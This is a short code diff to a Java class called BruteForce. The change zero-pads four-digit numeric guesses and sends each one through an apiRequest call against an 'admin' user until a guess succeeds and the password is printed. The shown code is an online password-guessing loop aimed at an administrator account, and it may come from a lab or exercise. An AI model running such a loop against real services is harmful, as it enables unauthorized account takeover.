@@ -34,11 +34,21 @@ public class BruteForce {
         for (int password = 0; password < iterations; password++) {
             long start2 = System.nanoTime();
 
-            String formatPassword = String.valueOf(password);
-            System.out.println("Attempt: " + password);
+            String formatPassword;
+
+            if(password <= 9){
+                formatPassword = "000" + password;
+            } else if(password <= 99){
+                formatPassword = "00" + password;
+            } else if(password <= 999){
+                formatPassword = "0" + password;
+            } else {
+                formatPassword = String.valueOf(password);
+            }
+            System.out.println("Attempt: " + formatPassword);
 
             if(apiRequest(userAdmin, formatPassword)){
-                System.out.println("Password: " + password);
+                System.out.println("Password: " + formatPassword);
                 break;
             }
             long end2 = System.nanoTime();
